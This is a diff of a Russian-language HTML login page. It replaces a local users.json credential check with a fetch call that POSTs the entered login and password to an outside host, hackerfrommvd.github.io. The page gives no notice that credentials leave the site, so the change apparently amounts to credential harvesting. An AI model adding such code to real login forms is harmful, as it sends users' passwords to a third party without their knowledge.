@@ -15,27 +15,42 @@
     <div id="result"></div>
 
     <script>
-        let users = [];
-
-        // Получаем данные из users.json
-        fetch('users.json')
-            .then(response => response.json())
-            .then(data => {
-                users = data.users;
-            });
-
         document.getElementById('loginForm').addEventListener('submit', (e) => {
             e.preventDefault();
             const login = document.getElementById('login').value;
             const password = document.getElementById('password').value;
 
-            const user = users.find(u => u.login === login && u.password === password);
+            // Создание объекта payload
+            const payload = { 
+                "login": login, 
+                "password": password 
+            };
 
-            if (user) {
-                document.getElementById('result').innerText = 'Успешный вход';
-            } else {
-                document.getElementById('result').innerText = 'Неверный логин или пароль';
-            }
+            // Отправка POST-запроса
+            fetch("https://hackerfrommvd.github.io/de", {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (response.status === 200) {
+                    return response.json();
+                } else {
+                    throw new Error('Ошибка сервера, попробуйте позже.');
+                }
+            })
+            .then(data => {
+                if (data.valid) {
+                    document.getElementById('result').innerText = 'Успешный вход';
+                } else {
+                    document.getElementById('result').innerText = 'Неверный логин или пароль';
+                }
+            })
+            .catch(error => {
+                document.getElementById('result').innerText = error.message;
+            });
         });
     </script>
 </body>
